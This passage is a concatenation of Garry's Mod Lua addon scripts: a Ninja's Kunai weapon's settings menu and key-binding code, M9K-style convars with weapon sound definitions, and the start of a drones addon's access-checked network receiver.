██║██║ ╚████║    ██║  ██║██║ ╚████║   ██║       ███████║██║  ██║██║  ██║██║     ███████╗    ╚██████╔╝██║  ██║    ██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║
╚═╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝       ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝     ╚═════╝ ╚═╝  ╚═╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝

-------------------------------------------------------- DO NOT REUPLOAD IN ANY SHAPE OR FORM -------------------------------------------------------- 
-------------------------------------------------------- DO NOT REUPLOAD IN ANY SHAPE OR FORM -------------------------------------------------------- 
-------------------------------------------------- IF YOU EDIT ANYTHING YOU ARE VOID OF MY SUPPORT --------------------------------------------------- 
-------------------------------------------------- IF YOU EDIT ANYTHING YOU ARE VOID OF MY SUPPORT --------------------------------------------------- 

*/

AddCSLuaFile()

CreateConVar( 'sk_mas_ninjaskunai_enabled', '1', { FCVAR_ARCHIVE, FCVAR_REPLICATED, FCVAR_SERVER_CAN_EXECUTE } )
CreateConVar( 'sk_mas_ninjaskunai_adminonly', '0', { FCVAR_ARCHIVE, FCVAR_SERVER_CAN_EXECUTE } )
CreateConVar( 'sk_mas_ninjaskunai_infinitecharge', '0', { FCVAR_ARCHIVE, FCVAR_REPLICATED, FCVAR_SERVER_CAN_EXECUTE }, "Enable infinite charge for this SWEP" )
CreateConVar( 'sk_mas_ninjaskunai_nocooldown', '0', { FCVAR_ARCHIVE, FCVAR_REPLICATED, FCVAR_SERVER_CAN_EXECUTE }, "Disable cooldowns for this SWEP" )
CreateConVar( 'sk_mas_lagcompensate_npc', '1', { FCVAR_ARCHIVE, FCVAR_REPLICATED, FCVAR_SERVER_CAN_EXECUTE }, "Leave this active unless it is confirmed to be conflicting with another addon or if you are maxing your CPU and RAM and need every scrap. Removing this greatly affects player perspectives and should be re-enabled ASAP." )
CreateConVar( 'sk_mas_setmaxhealth_onspawn', '1', { FCVAR_ARCHIVE, FCVAR_REPLICATED, FCVAR_SERVER_CAN_EXECUTE }, "Leave this active unless it is actually conflicting with another addon. Disabling this results in healing abilities only going to 100 HP (the default max health) unless defined by another addon. DarkRP DOES NOT set MAX HEALTH by default, hence why I made this code!" )

	Maranzos_AbilitySWEPs = Maranzos_AbilitySWEPs or {}
		
		if SERVER then
			cvars.AddChangeCallback( "sk_mas_ninjaskunai_infinitecharge", function( convar_name, value_old, value_new )
				Maranzos_AbilitySWEPs.BMS_InfUlt	= tobool( GetConVarNumber( "sk_mas_ninjaskunai_infinitecharge" ) )
			end )
			cvars.AddChangeCallback( "sk_mas_ninjaskunai_nocooldown", function( convar_name, value_old, value_new )
				Maranzos_AbilitySWEPs.BMS_NoCD	= tobool( GetConVarNumber( "sk_mas_ninjaskunai_nocooldown" ) )
			end )
		end

if (CLIENT) then

print("\n")
print("[MAS] Maranzo\'s Ability SWEPs: Ninja's Kunai")
print("[MAS]: Options Loaded")
	
	MASconvar_drawhud = CreateClientConVar( 'cl_mas_drawhud', '1' )
	MASconvar_crosshairon = CreateClientConVar( 'cl_mas_crosshairon', '1' )
	MASconvar_preventbinds = CreateClientConVar( 'cl_mas_preventbinds', '1' )
	
	Maranzos_AbilitySWEPs.keyconfigs = Maranzos_AbilitySWEPs.keyconfigs or {}
	
	
-------------------------------------------------------------------
-- Define General Use Functions
	
	local function AS_SaveStoredConfig()
		file.Write( 'mas/maranzo_as_bindings.txt', util.TableToJSON( Maranzos_AbilitySWEPs.keyconfigs, true ) )
		print("[MAS]: Saved binds to Maranzo_AS_bindings.txt \n")
	end // end Save Config


-- Default Binds

	local function AS_DefaultKeyConfigs() 
		print("[MAS]: Default Keybinds Set")
		local KB = {} -- Maranzos_AbilitySWEPs.keyconfigs or {} -- Key Bindings
		
		KB["Binds"] = {
			[ 1 ]	=	input.LookupBinding( "+attack", true ),
			[ 2 ]	=	input.LookupBinding( "+attack2", true ),
			[ 3 ]	=	KEY_F,
			[ 4 ]	=	KEY_C,
			[ 5 ]	=	KEY_T,
			[ 6 ]	=	MOUSE_MIDDLE,
		}
		
		// Add a table with just the Btn names first
		KB["Btn"] = {}
		for k, v in pairs(KB["Binds"]) do
			KB["Btn"][v] = tonumber(k)
		end
		
		// Create a proper display name for these keys
		KB[ 1 ] = string.upper( language.GetPhrase( KB["Binds"][ 1 ] ) ) -- Attack
		KB[ 2 ] = string.upper( language.GetPhrase( KB["Binds"][ 2 ] ) ) -- Abil 1
		KB[ 3 ] = string.upper( language.GetPhrase( input.GetKeyName( KB["Binds"][ 3 ] ) ) ) -- Abil 2
		KB[ 4 ] = string.upper( language.GetPhrase( input.GetKeyName( KB["Binds"][ 4 ] ) ) ) -- Abil 3
		KB[ 5 ] = string.upper( language.GetPhrase( input.GetKeyName( KB["Binds"][ 5 ] ) ) ) -- Ult
		KB[ 6 ] = string.upper( language.GetPhrase( input.GetKeyName( KB["Binds"][ 6 ] ) ) ) -- Abil Select
		if KB[ 1 ] == "MOUSE1" then KB[ 1 ] = "LMB" end
		if KB[ 2 ] == "MOUSE2" then KB[ 2 ] = "RMB" end
		
		table.Empty( Maranzos_AbilitySWEPs.keyconfigs )
		table.Merge( Maranzos_AbilitySWEPs.keyconfigs, KB )
		AS_SaveStoredConfig()
		
	end // end Default Key Config
	
	local function AS_LoadStoredConfig()
		if file.Exists( 'mas/maranzo_as_bindings.txt', 'DATA' ) then
			local fl = file.Read( 'mas/maranzo_as_bindings.txt', 'DATA' )
			if fl then // Confirming if there is a File
				fl = util.JSONToTable( fl )
				if istable( fl ) then
					print("[MAS]: Binding Table Loaded \n")
					table.Empty( Maranzos_AbilitySWEPs.keyconfigs )
					table.Merge( Maranzos_AbilitySWEPs.keyconfigs, fl )
				end
			else // Can't read that shit
				print("[MAS]: Binding Table Not Found \n")
				AS_DefaultKeyConfigs()
			end // end If File Read
		else // No File Found
			file.CreateDir( "mas" )
			print("[MAS]: No Bindings file found \n")
			AS_DefaultKeyConfigs()
		end
	end // end Load Stored Config
	AS_LoadStoredConfig() -- load it
	
	local function UI_MakeBinder( name, ability )
		name:SetTall( 50 )
		if Maranzos_AbilitySWEPs.keyconfigs[ ability ] then
			name:SetValue( Maranzos_AbilitySWEPs.keyconfigs["Binds"][ ability ] )
		end
		
		function name:OnChange( num )
			local lastBtn = Maranzos_AbilitySWEPs.keyconfigs["Binds"][ ability ]
			Maranzos_AbilitySWEPs.keyconfigs["Btn"][ lastBtn ] = false -- Disable Prev Btn
			Maranzos_AbilitySWEPs.keyconfigs["Binds"][ ability ] = num -- Set new key as binded ( "Btn" is what counts )
			Maranzos_AbilitySWEPs.keyconfigs["Btn"][ num ] = ability -- Enable new number
			Maranzos_AbilitySWEPs.keyconfigs[ ability ] = string.upper( language.GetPhrase( input.GetKeyName( num ) ) ) -- Set Display Text
			AS_SaveStoredConfig()
		end
		
		return name
	end // end Fn UI_MakeBinder
-- Tool Options

	hook.Add( 'PopulateToolMenu', 'Maranzo_AS_ninjaskunai', function()
		spawnmenu.AddToolMenuOption( 'Options',
			'Ability SWEPs',
			'Maranzo_AS_ninjaskunai',
			"MAS: Ninja's Kunai",
			'',
			'',
			function( pnl )
				pnl:ControlHelp( '' )
				pnl:Help( "Maranzo\'s Ability SWEPs: Ninja's Kunai" )
				pnl:ControlHelp( 'Created by Maranzo. I hope you enjoy it!' )
				pnl:ControlHelp( '' )

				local btnBug = vgui.Create( 'DButton' )
				btnBug:SetText( 'REPORT A BUG' )
				btnBug.DoClick = function()
					gui.OpenURL( 'http://steamcommunity.com/workshop/filedetails/discussion/947006398/2333276539590974512/' )
				end
				btnBug:SetTall( 25 )
				pnl:AddItem( btnBug )

				local btnMore = vgui.Create( 'DButton' )
				btnMore:SetText( 'View More by Maranzo' )
				btnMore.DoClick = function()
					gui.OpenURL( 'http://steamcommunity.com/id/Maranzo/myworkshopfiles/?appid=4000' )
				end
				btnMore:SetTall( 50 )
				pnl:AddItem( btnMore )

				local btnRate = vgui.Create( 'DButton' )
				btnRate:SetText( 'Rate this SWEP' )
				btnRate.DoClick = function()
					gui.OpenURL( 'http://steamcommunity.com/sharedfiles/filedetails/?id=947006398' )
				end
				btnRate:SetTall( 50 )
				pnl:AddItem( btnRate )
				pnl:ControlHelp( 'Rate this SWEP and find the Official Suggestions page from here!' )
				pnl:ControlHelp( '' )
				
				pnl:CheckBox( 'Draw HUD', 'cl_mas_drawhud' )
				pnl:ControlHelp( 'Enable / Disable the showing of Ability icons, Binds, and Combo when the SWEP is out' )
				
				pnl:CheckBox( 'Show Crosshair', 'cl_mas_crosshairon' )
				pnl:ControlHelp( 'Enable / Disable the crosshair. Note: You must switch to another weapon for this to take effect. In Singleplayer you must strip the weapon / die.' )
				
				pnl:CheckBox( 'Prevent Basic Binds ( Flashlight, Menu, CMenu )', 'cl_mas_preventbinds' )
				pnl:ControlHelp( 'Prevent your prop spawn menu, context menu, and flashlight from working while the SWEP is out. By Default this is on to prevent overlap.' )
				pnl:ControlHelp( '' )
				
				pnl:Help( 'Attack: Kunai Slash' )
				pnl:Dock( FILL )
				local MAS_AA = vgui.Create( "DButton" )
				MAS_AA:SetTall( 50 )
				MAS_AA:SetText( Maranzos_AbilitySWEPs.keyconfigs[ 1 ] )
				pnl:AddItem( MAS_AA )
				pnl:ControlHelp( 'This is your +attack key \n( Usually your Left Mouse Button )' )
				MAS_AA:SetDisabled( true )
				
				pnl:Help( 'Ability: Throw Kunai' )
				pnl:Dock( FILL )
				local MAS_AbThrow = vgui.Create( "DButton" )
				MAS_AbThrow:SetTall( 50 )
				MAS_AbThrow:SetText( Maranzos_AbilitySWEPs.keyconfigs[ 2 ] )
				pnl:AddItem( MAS_AbThrow )
				pnl:ControlHelp( 'This is your +attack2 key \n( Usually your Right Mouse Button )' )
				MAS_AbThrow:SetDisabled( true )
				
				pnl:Help( 'Ability: Ninja Dash' )
				local MAS_AbDash = vgui.Create( "DBinder" )
				pnl:AddItem( UI_MakeBinder( MAS_AbDash, 3 ) )
				
				pnl:Help( 'Ability: Concealment' )
				local MAS_AbConceal = vgui.Create( "DBinder" )
				pnl:AddItem( UI_MakeBinder( MAS_AbConceal, 4 ) )
				
				pnl:Help( 'Ability: Substitution' )
				local MAS_AbSubs = vgui.Create( "DBinder" )
				pnl:AddItem( UI_MakeBinder( MAS_AbSubs, 5 ) )
				
				pnl:Help( 'Ability Selection' )
				local MAS_AbSel = vgui.Create( "DBinder" )
				pnl:AddItem( UI_MakeBinder( MAS_AbSel, 6 ) )
				pnl:ControlHelp( ' ' )
				
				pnl:Help( 'Holster Weapon' )
				pnl:Dock( FILL )
				local MAS_Holst = vgui.Create( "DBinder" )
				MAS_Holst:SetTall( 50 )
				MAS_Holst:SetText( string.upper( language.GetPhrase( input.LookupBinding( "+Reload", true ) ) ) )
				pnl:AddItem( MAS_Holst )
				pnl:ControlHelp( 'This is your +reload key \n( Usually your "R" Button )' )
				MAS_Holst:SetDisabled( true )
				
				local def = vgui.Create( 'DButton' )
				def:SetText( 'RESTORE DEFAULTS' )
				def.DoClick = function()
					Derma_Query( [[Are you sure you want to restore default settings?
					This cannot be undone!]],
						'Maranzo\'s Ability SWEPs: Defaults',
						'Yes, I\'m sure',
						function()
							-- Console: Client Side
							RunConsoleCommand( 'cl_mas_drawhud', '1' )
							RunConsoleCommand( 'cl_mas_crosshairon', '1' )
							RunConsoleCommand( 'cl_mas_preventbinds', '1' )
							
							-- Abilities: Key Binds
							AS_DefaultKeyConfigs()
							MAS_AA:SetText( Maranzos_AbilitySWEPs.keyconfigs["Binds"][ 1 ] )
							MAS_AbThrow:SetText( Maranzos_AbilitySWEPs.keyconfigs["Binds"][ 2 ] )
							MAS_AbDash:SetValue( Maranzos_AbilitySWEPs.keyconfigs["Binds"][ 3 ] )
							MAS_AbConceal:SetValue( Maranzos_AbilitySWEPs.keyconfigs["Binds"][ 4 ] )
							MAS_AbSubs:SetValue( Maranzos_AbilitySWEPs.keyconfigs["Binds"][ 5 ] )
							MAS_AbSel:SetValue( Maranzos_AbilitySWEPs.keyconfigs["Binds"][ 6 ] )
							
							Derma_Message( 'Settings have been successfully restored to defaults.', 'Maranzo\'s Ability SWEPs: Defaults', 'OK' )
						end,
						'No, abort action' )
				end
				def:SetTall( 25 )
				pnl:AddItem( def )
				pnl:ControlHelp( '' )

				if LocalPlayer():IsAdmin() then
					pnl:Help( 'Admin Options' )
					pnl:ControlHelp( 'All options affect the whole server' )
					pnl:CheckBox( 'Spawnable SWEP', 'sk_mas_ninjaskunai_enabled' )
					pnl:ControlHelp( 'Console variant: sk_mas_ninjaskunai_enabled. Note: This will take effect on map change. It may still be spawned through the give weapon command.' )
					pnl:CheckBox( 'Admin Spawnable only', 'sk_mas_ninjaskunai_adminonly' )
					pnl:ControlHelp( 'Console variant: sk_mas_ninjaskunai_adminonly. Note: Map change, or you must die / drop / strip it & spawn it again in order for this to take effect' )
					pnl:CheckBox( 'Cheat: Infinite Ultimate Charge' , 'sk_mas_ninjaskunai_infinitecharge' )
					pnl:ControlHelp( 'Console variant: sk_mas_ninjaskunai_infinitecharge. Note: Change is immediate.' )
					pnl:CheckBox( 'Cheat: No Cooldowns', 'sk_mas_ninjaskunai_nocooldown' )
					pnl:ControlHelp( 'Console variant: sk_mas_ninjaskunai_infinitecharge. Note: You must die/ drop / strip it & spawn it again in order for this to take effect.' )
					pnl:ControlHelp( '' )
					
					pnl:Help( 'How awesome is this slider?' )
					pnl:NumSlider( 'Awesomeness', '', 1, 10, 0 )
					pnl:NumSlider( 'Slidiness', '', 1, 100, 0 )
					pnl:ControlHelp( '' )
					pnl:ControlHelp( '' )
				end // end If Admin
				
				if LocalPlayer():IsSuperAdmin() then
					pnl:Help( 'Super-Admin Options' )
					pnl:ControlHelp( "Note, each of these options can have a huge impact on player perspectives. It is recommended to leave the options below enabled." )
					pnl:CheckBox( 'Record Max Health on Spawn', 'sk_mas_setmaxhealth_onspawn' )
					pnl:ControlHelp( "Console variant: sk_mas_setmaxhealth_onspawn. Note: Map change only. Leave this active unless it is actually conflicting with another addon. Disabling this results in healing abilities only going to 100 HP (the default max health) unless defined by another addon. DarkRP DOES NOT set MAX HEALTH by default, hence why I made this code!" ) 
					pnl:CheckBox( 'NPC Lag Compensation', 'sk_mas_lagcompensate_npc' )
					pnl:ControlHelp( "Console variant: sk_mas_lagcompensate_npc. Note: Map change only. Keep this on even if NPC's aren't currently in use. Leave this active unless it is confirmed to be conflicting with another addon or if you are maxing your CPU and RAM and need every scrap. Removing this greatly affects player perspectives and should be re-enabled ASAP." )
					pnl:ControlHelp( '' )
					pnl:ControlHelp( '' )
					
				end // end If SuperAdmin
				
			end ) // end F'n
			
		print("MAS: Populated Tool Menu")
	end ) // end Hook Tool Menu


end // end If Client
--PATH addons/__main/lua/autorun/csocf_weaponry.lua:
--these are some variables we need to keep for stuff to work
--that means don't delete them
if GetConVar( "M9KWeaponStrip" ) == nil then
	CreateConVar( "M9KWeaponStrip", "0", { FCVAR_REPLICATED, FCVAR_NOTIFY, FCVAR_ARCHIVE }, "Allow empty weapon stripping? 1 for true, 0 for false" )
	print( "Weapon Strip con var created" )
end

if GetConVar( "M9KDisablePenetration" ) == nil then
	CreateConVar( "M9KDisablePenetration", "1", { FCVAR_REPLICATED, FCVAR_NOTIFY, FCVAR_ARCHIVE }, "Disable Penetration and Ricochets? 1 for true, 0 for false" )
	print( "Penetration/ricochet con var created" )
end

if GetConVar( "M9KDynamicRecoil" ) == nil then
	CreateConVar( "M9KDynamicRecoil", "1", { FCVAR_REPLICATED, FCVAR_NOTIFY, FCVAR_ARCHIVE }, "Use Aim-modifying recoil? 1 for true, 0 for false" )
	print( "Recoil con var created" )
end

if GetConVar( "M9KUniqueSlots" ) == nil then
	CreateConVar( "M9KUniqueSlots", "0", { FCVAR_REPLICATED, FCVAR_NOTIFY, FCVAR_ARCHIVE }, "Give M9K Weapons unique slots? 1 for true, 2 for false. A map change may be required." )
	print( "Unique Slots con var created" )
end

if GetConVar( "M9KDisableHolster" ) == nil then
	CreateConVar( "M9KDisableHolster", "0", { FCVAR_REPLICATED, FCVAR_NOTIFY, FCVAR_ARCHIVE }, "Disable my totally worthless and broken holster system? Won't hurt my feelings any. 1 for true, 2 for false. A map change may be required." )
	print( "Holster Disable con var created" )
end

if GetConVar( "M9KAmmoDetonation" ) == nil then
	CreateConVar( "M9KAmmoDetonation", "0", { FCVAR_REPLICATED, FCVAR_NOTIFY, FCVAR_ARCHIVE }, "Enable detonatable M9K Ammo crates? 1 for true, 0 for false." )
	print( "Ammo crate detonation con var created" )
end

if GetConVar( "DebugM9K" ) == nil then CreateConVar( "DebugM9K", "0", { FCVAR_REPLICATED, FCVAR_ARCHIVE }, "Debugging for some m9k stuff, turning it on won't change much." ) end
if not game.SinglePlayer() then
	if CLIENT then
		if GetConVar( "M9KGasEffect" ) == nil then
			CreateClientConVar( "M9KGasEffect", "1", true, true )
			print( "Client-side Gas Effect Con Var created" )
		end
	end
else
	if GetConVar( "M9KGasEffect" ) == nil then
		CreateConVar( "M9KGasEffect", "0", { FCVAR_REPLICATED, FCVAR_NOTIFY, FCVAR_ARCHIVE }, "Use gas effect when shooting? 1 for true, 0 for false" )
		print( "Gas effect con var created" )
	end
end

--G36B
sound.Add( {
	name = "gunshot_sound",
	channel = CHAN_USER_BASE + 10, --see how this is a different channel? Gunshots go here
	volume = 1.0,
	sound = "weapons/G36B/B5_fire.wav"
} )

sound.Add( {
	name = "B5.Out",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/G36B/B5_Out.wav"
} )

sound.Add( {
	name = "B5.In_1",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/G36B/B5_In1.wav"
} )

sound.Add( {
	name = "B5.In_2",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/G36B/B5_In2.wav"
} )

sound.Add( {
	name = "B5.Deploy",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/G36B/B5_Deploy.wav"
} )

--Xbow
sound.Add( {
	name = "xbow_sound",
	channel = CHAN_USER_BASE + 10, --see how this is a different channel? Gunshots go here
	volume = 1.0,
	sound = "weapons/Xbow/Crossbow_Fire.wav"
} )

sound.Add( {
	name = "Crossbow.Foley1",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/Xbow/Crossbow_Foley_1.wav"
} )

sound.Add( {
	name = "Crossbow.Foley2",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/Xbow/Crossbow_Foley_2.wav"
} )

sound.Add( {
	name = "Crossbow.Foley3",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/Xbow/Crossbow_Foley_3.wav"
} )

sound.Add( {
	name = "Crossbow.Foley4",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/Xbow/Crossbow_Foley_4.wav"
} )

sound.Add( {
	name = "Crossbow.Deploy",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/Xbow/Crossbow_Deploy.wav"
} )

--L96_Dragon
sound.Add( {
	name = "pop_sound",
	channel = CHAN_USER_BASE + 10, --see how this is a different channel? Gunshots go here
	volume = 1.0,
	sound = "weapons/CF_L96/G_MZC_AWM_FIRE.wav"
} )

sound.Add( {
	name = "Weapon_CFAWP.Bolt",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/CF_L96/G_RELOAD_AWM.wav"
} )

sound.Add( {
	name = "Weapon_CFAWP.Clipout",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/CF_L96/G_MZC_AWM_CLIPOUT.wav"
} )

sound.Add( {
	name = "Weapon_CFAWP.Clipin",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/CF_L96/G_MZC_AWM_CLIPIN.wav"
} )

--FlintLock_Divine
sound.Add( {
	name = "Flint_Shot",
	channel = CHAN_USER_BASE + 10, --see how this is a different channel? Gunshots go here
	volume = 1.0,
	sound = "weapons/D_Flint/Flintlock_Fire.wav"
} )

sound.Add( {
	name = "Flintlock.In_1",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/D_Flint/Flintlock_In_1.wav"
} )

sound.Add( {
	name = "Flintlock.In_2",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/D_Flint/Flintlock_In_2.wav"
} )

sound.Add( {
	name = "Flintlock.In_3",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/D_Flint/Flintlock_In_3.wav"
} )

sound.Add( {
	name = "Flintlock.Draw",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/D_Flint/Flintlock_Draw.wav"
} )

--Tempest
sound.Add( {
	name = "Temp_Shot",
	channel = CHAN_USER_BASE + 10, --see how this is a different channel? Gunshots go here
	volume = 1.0,
	sound = "weapons/Temp/SF_SMG_Fire.wav"
} )

sound.Add( {
	name = "SF_SMG.Out",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/Temp/SF_SMG_Out.wav"
} )

sound.Add( {
	name = "SF_SMG.In_1",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/Temp/SF_SMG_In_1.wav"
} )

sound.Add( {
	name = "SF_SMG.In_2",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/Temp/SF_SMG_In_2.wav"
} )

sound.Add( {
	name = "SF_SMG.Deploy",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/Temp/SF_SMG_Deploy.wav"
} )

--E_Blaster
sound.Add( {
	name = "E_Shot",
	channel = CHAN_USER_BASE + 10, --see how this is a different channel? Gunshots go here
	volume = 1.0,
	sound = "weapons/E_Blaster/SF Ethereal Fire.wav"
} )

sound.Add( {
	name = "SF Ethereal.Deploy",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/E_Blaster/SF Ethereal Deploy.wav"
} )

sound.Add( {
	name = "SF Ethereal.Reload",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/E_Blaster/SF Ethereal Reload.wav"
} )

--MP5_Guitar
sound.Add( {
	name = "Guitar_Shot",
	channel = CHAN_USER_BASE + 10, --see how this is a different channel? Gunshots go here
	volume = 1.0,
	sound = "weapons/MP5_Guitar/Guitar Fire.wav"
} )

sound.Add( {
	name = "Guitar.Out",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/MP5_Guitar/Guitar Out.wav"
} )

sound.Add( {
	name = "Guitar.On",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/MP5_Guitar/Guitar On.wav"
} )

sound.Add( {
	name = "Guitar.In",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/MP5_Guitar/Guitar In.wav"
} )

sound.Add( {
	name = "Guitar.Deploy",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/MP5_Guitar/Guitar Deploy.wav"
} )

--MAC_Lara
sound.Add( {
	name = "MAC_Shot",
	channel = CHAN_USER_BASE + 10, --see how this is a different channel? Gunshots go here
	volume = 1.0,
	sound = "weapons/MAC_Lara/Lara Fire.wav"
} )

sound.Add( {
	name = "Lara.Draw",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/MAC_Lara/Lara Draw.wav"
} )

sound.Add( {
	name = "Lara.Reload",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/MAC_Lara/Lara Reload.wav"
} )

--M3_Umbrella
sound.Add( {
	name = "M3_Shot",
	channel = CHAN_USER_BASE + 10, --see how this is a different channel? Gunshots go here
	volume = 1.0,
	sound = "weapons/M3_Umbrella/Umbrella Gun Fire.wav"
} )

sound.Add( {
	name = "Umbrella Gun.Insert",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/M3_Umbrella/Umbrella Gun Insert.wav"
} )

sound.Add( {
	name = "Umbrella Gun.After Reload",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/M3_Umbrella/Umbrella Gun After Reload.wav"
} )

sound.Add( {
	name = "Umbrella Gun.Start Reload",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/M3_Umbrella/Umbrella Gun Start Reload.wav"
} )

sound.Add( {
	name = "Umbrella Gun.Draw",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/M3_Umbrella/Umbrella Gun Draw.wav"
} )

--D_Slingshot
sound.Add( {
	name = "Sling_Shot",
	channel = CHAN_USER_BASE + 10, --see how this is a different channel? Gunshots go here
	volume = 1.0,
	sound = "weapons/D_Slingshot/Catapult Fire.wav"
} )

sound.Add( {
	name = "Catapult.Deploy",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/D_Slingshot/Catapult Deploy.wav"
} )

sound.Add( {
	name = "Catapult.Reload",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/D_Slingshot/Catapult Reload.wav"
} )

--TMP_Dragon
sound.Add( {
	name = "TMP_Shot",
	channel = CHAN_USER_BASE + 10, --see how this is a different channel? Gunshots go here
	volume = 1.0,
	sound = "weapons/TMP_Dragon/Dragon TMP Fire.wav"
} )

sound.Add( {
	name = "Dragon TMP.In",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/TMP_Dragon/Dragon TMP In.wav"
} )

sound.Add( {
	name = "Dragon TMP.Out",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/TMP_Dragon/Dragon TMP Out.wav"
} )

sound.Add( {
	name = "Dragon TMP.Deploy",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/TMP_Dragon/Dragon TMP Deploy.wav"
} )

--M4A1_Beast
sound.Add( {
	name = "M4_Shot",
	channel = CHAN_USER_BASE + 10, --see how this is a different channel? Gunshots go here
	volume = 1.0,
	sound = "weapons/M4_Beast/m4_unsil-1.wav"
} )

sound.Add( {
	name = "Weapon_CFM4A2.Clipin",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/M4_Beast/m4_clipin.wav"
} )

sound.Add( {
	name = "Weapon_CFM4A2.Clipout",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/M4_Beast/m4_clipout.wav"
} )

sound.Add( {
	name = "Weapon_CFM4A2.Boltpull",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/M4_Beast/m4_boltpull.wav"
} )

--AK47_Beast
sound.Add( {
	name = "AK_Shot",
	channel = CHAN_USER_BASE + 10, --see how this is a different channel? Gunshots go here
	volume = 1.0,
	sound = "weapons/AK_Beast/ak-1.wav"
} )

sound.Add( {
	name = "Weapon_AKMP.Boltpull",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/AK_Beast/ak_boltpull.wav"
} )

sound.Add( {
	name = "Weapon_AKMP.Clipin",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/AK_Beast/ak_clipin.wav"
} )

sound.Add( {
	name = "Weapon_AKMP.Clipout",
	channel = CHAN_ITEM,
	volume = 1.0,
	sound = "weapons/AK_Beast/ak_clipout.wav"
} )
--PATH addons/_drones/lua/dronesrewrite/receiver.lua:
local function checkAccess( ply )
	local usergroup = ply:GetUserGroup()
	local sid = ply:SteamID()
	if usergroup ~= "superadmin" and not DRONES_ACCESS[sid] then return true end
	return false
end

if SERVER then
	util.AddNetworkString("dronesrewrite_keyvalue")
	util.AddNetworkString("dronesrewrite_addweapon")

	-- New net system

	-- Main requests
	-- Keys
	net.Receive("dronesrewrite_keyvalue", function(len, ply)
		if checkAccess( ply ) then return end
		local key = net.ReadUInt(7)
		local pressed = net.ReadBit()

		local drone = ply:GetNWEntity("DronesRewriteDrone")

		if drone:IsValid() then 
			local bind = DRONES_REWRITE.KeyNames[key]

			if bind then 
				if not drone.Keys[bind] then drone.Keys[bind] = { } end
				drone.Keys[bind].Pressed = tobool(pressed)
			end

			for k, v in pairs(DRONES_REWRITE.Keys) do
				if ply:GetInfoNum("dronesrewrite_key_" .. k, 0) == key then
					if not drone.Keys[k] then drone.Keys[k] = { } end
					drone.Keys[k].Pressed = tobool(pressed)

					break
				end
			end
		end
	end)

	net.Receive("dronesrewrite_addweapon", function(len, ply)
		if not ply:IsSuperAdmin() then return end

		local drone = net.ReadEntity()
		if not IsValid(drone) then return end

		local wepName = net.ReadString()
		local wep = net.ReadString()
		if not DRONES_REWRITE.Weapons[wep] then return end

		local ang = net.ReadAngle()
		local pos = net.ReadVector()
		local sync = net.ReadTable()

		local select = net.ReadBool()
		local prims = net.ReadBool()

		local att = net.ReadString()

		drone:FastAddWeapon(wepName, wep, pos, sync, ang, select, prims, att)
	end)


	-- Clientside
	util.AddNetworkString("dronesrewrite_updcam")
	util.AddNetworkString("dronesrewrite_playsound")
	util.AddNetworkString("dronesrewrite_doprecache")
	util.AddNetworkString("dronesrewrite_closeconsole")
	util.AddNetworkString("dronesrewrite_opencontroller")
	util.AddNetworkString("dronesrewrite_clearconsole")
	util.AddNetworkString("dronesrewrite_openconsole")
	util.AddNetworkString("dronesrewrite_addline")
	util.AddNetworkString("dronesrewrite_removehook")
	util.AddNetworkString("dronesrewrite_addhook")
	util.AddNetworkString("dronesrewrite_openselectmenu")
	util.AddNetworkString("dronesrewrite_openbindsmenu")
	util.AddNetworkString("dronesrewrite_openweaponscustom")
	util.AddNetworkString("dronesrewrite_sniperrifle")
	util.AddNetworkString("dronesrewrite_sniperrifle_crosshair")

	-- Serverside
	util.AddNetworkString("dronesrewrite_addfriend")
	util.AddNetworkString("dronesrewrite_controldr")
	util.AddNetworkString("dronesrewrite_controllerlookup")
	util.AddNetworkString("dronesrewrite_conexit")
	util.AddNetworkString("dronesrewrite_concmd")
